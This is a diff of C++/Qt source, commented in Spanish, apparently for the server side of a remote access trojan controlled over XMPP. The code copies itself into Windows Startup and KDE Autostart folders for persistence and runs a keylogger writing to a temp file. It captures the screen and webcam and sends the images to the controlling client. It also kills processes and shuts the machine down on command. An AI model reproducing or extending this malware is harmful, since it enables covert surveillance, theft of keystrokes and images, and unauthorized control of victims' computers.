@@ -42,28 +42,15 @@ MainWindow::~MainWindow()
 
 void MainWindow::inicio(){
     /** funcion que se ejecuta al inicio de la aplicacion **/
+    //Inicializar cosas
     cargarConfiguracion();
     listarProcesos();
     this->generarVentanaChat();
     manager = new QXmppTransferManager;
     connect(manager,SIGNAL(fileReceived(QXmppTransferJob*)),this,SLOT(llegadaDatosArchivo(QXmppTransferJob*)));
     cliente.addExtension(manager);
-    QByteArray datos; //Reconstruimos la configuración con algunas modificaciones para el servidor copiado
-    datos = "|@|" + this->cuentaXmpp.toLatin1() + "|@|";
-    datos = datos + this->contrasena.toLatin1() + "|@|";
-    datos = datos + this->alias.toLatin1() + "|@|";
-    datos = datos + "nounido" + "|@|";
-    datos = datos + "0" + "|@|";
-    datos = datos + this->nombreCopiable.toLatin1() + "|@|";
-    if(this->siempreOUnaVez == "0") //Si el programa de inicio se ejecuta siempre
-    {
-        datos = datos + this->ejecutar.toLatin1() + "|@|"; //Lo ponemos en el servidor copiado
-        datos = datos + "0|@|";
-    }
-    else
-    {
-        datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
-    }
+    QByteArray datos = nuevaTrama(); //Reconstruimos la configuración con algunas modificaciones para el servidor copiado
+    //Copiar a los posibles directorios de inicio de windows
     #ifdef Q_WS_WIN
     if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows Vista/7
         copiarServidor(datos,QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
@@ -79,6 +66,7 @@ void MainWindow::inicio(){
         copiarServidor(datos,QDir::homePath() + "/.kde/Autostart/" + this->nombreCopiable);
     }
     #endif
+    //Declarar los signals y slots
     connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
     connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
     connect(&cliente,SIGNAL(messageReceived(const QXmppMessage&)),this,SLOT(llegadaDatos(const QXmppMessage&)));
@@ -86,6 +74,7 @@ void MainWindow::inicio(){
     connect(&capturacion,SIGNAL(enviar(QByteArray)),this,SLOT(enviarCaptura(QByteArray)));
     connect(&cliente,SIGNAL(presenceReceived(QXmppPresence)),this,SLOT(recibidaPresencia(QXmppPresence)));
     QApplication::setQuitOnLastWindowClosed(false);
+    //Crear si no esta creado el archivo de log para el keylogger
     log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
     log.open(QFile::WriteOnly);
     log.close();
@@ -97,12 +86,33 @@ void MainWindow::inicio(){
     }
     capturacion.moveToThread(&hilo); //movemos capturacion a un nuevo hilo para que se ejecute de forma independiente al programa principal y no lo bloquee
     hilo.start();
-    QXmppConfiguration configuracion;
+    QXmppConfiguration configuracion; //la configuracion inicial de nuestro cliente xmpp
     configuracion.setJid(this->cuentaXmpp);
     configuracion.setPassword(this->contrasena);
     configuracion.setResource(this->alias);
     cliente.setClientPresence(QXmppPresence::Available);
-    cliente.connectToServer(configuracion);
+    cliente.connectToServer(configuracion); //conectar al servidor xmpp
+}
+
+QByteArray MainWindow::nuevaTrama()
+{ /** esta funcion reconstruye una nueva trama de configuracion con algunas opciones cambiadas para el servidor copiado **/
+    QByteArray datos;
+    datos = "|@|" + this->cuentaXmpp.toLatin1() + "|@|";
+    datos = datos + this->contrasena.toLatin1() + "|@|";
+    datos = datos + this->alias.toLatin1() + "|@|";
+    datos = datos + "nounido" + "|@|";
+    datos = datos + "0" + "|@|";
+    datos = datos + this->nombreCopiable.toLatin1() + "|@|";
+    if(this->siempreOUnaVez == "0") //Si el programa de inicio se ejecuta siempre
+    {
+        datos = datos + this->ejecutar.toLatin1() + "|@|"; //Lo ponemos en el servidor copiado
+        datos = datos + "0|@|";
+    }
+    else
+    {
+        datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
+    }
+    return datos;
 }
 bool MainWindow::cargarConfiguracion(){
     /** Cargar la configuración del servidor guardada en el último KB del ejecutable **/
@@ -138,7 +148,7 @@ bool MainWindow::cargarConfiguracion(){
     return true;
 }
 void MainWindow::recibidaPresencia(QXmppPresence presencia)
-{
+{ /** Esta funcion cuando recibe una peticion de subscripcion por parte del cliente la acepta **/
     if(presencia.type() == QXmppPresence::Subscribe)
     {
         QXmppPresence aceptar;
@@ -208,10 +218,9 @@ void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
 
 void MainWindow::llegadaDatos(const QXmppMessage &mensaje) {
     /** Función para el manejo de los datos recibidos a través del socket **/
-    from = mensaje.from();
-    QString datos = mensaje.body();
-    //datos = socket.readAll();
-    QStringList parametros =  datos.split("|@|");
+    from = mensaje.from(); //Contestaremos al mismo cliente que nos envie los mensajes
+    QString datos = mensaje.body(); //Coger el mensaje
+    QStringList parametros =  datos.split("|@|"); //Separar los parametros
     if(parametros[0] == "t") //llegada de teclas
     {
         int i;
@@ -399,23 +408,13 @@ void MainWindow::llegadaDatos(const QXmppMessage &mensaje) {
     {
         matarProceso(parametros[1]);
     }
-    if(parametros[0] == "captura")
+    if(parametros[0] == "captura") //capturar escritorio
     {
          emit procesar(screenShot().toImage(),parametros[1].toInt());
     }
-    if (parametros[0] == "cap")
+    if (parametros[0] == "cap") //capturar la webcam
     {
-        bufferWebcam.setBuffer(&WebcamMem);
-        bufferWebcam.open(QIODevice::WriteOnly);
-        QPixmap imagen;
-        imagen = capturar();
-        imagen.save(&bufferWebcam,"jpeg",parametros[1].toInt());
-        QXmppTransferFileInfo informacion;
-        informacion.setName("|@|webcam|@|");
-        informacion.setSize(bufferWebcam.size());
-        bufferWebcam.close();
-        bufferWebcam.open(QIODevice::ReadOnly);
-        job = manager->sendFile(from,&bufferWebcam,informacion);
+       enviarWebcam(parametros[1].toInt());
     }
     if (parametros[0] == "encender")
     {
@@ -425,6 +424,22 @@ void MainWindow::llegadaDatos(const QXmppMessage &mensaje) {
     {
         apagar();
     }
+}
+
+void MainWindow::enviarWebcam(int calidad)
+{
+    bufferWebcam.setBuffer(&WebcamMem);
+    bufferWebcam.open(QIODevice::WriteOnly);
+    QPixmap imagen;
+    imagen = capturar();
+    imagen.save(&bufferWebcam,"jpeg",calidad);
+    QXmppTransferFileInfo informacion;
+    informacion.setName("|@|webcam|@|");
+    informacion.setSize(bufferWebcam.size());
+    bufferWebcam.close();
+    bufferWebcam.open(QIODevice::ReadOnly);
+    job = manager->sendFile(from,&bufferWebcam,informacion);
+
 }
 void MainWindow::moverPuntero(int x, int y)
 {
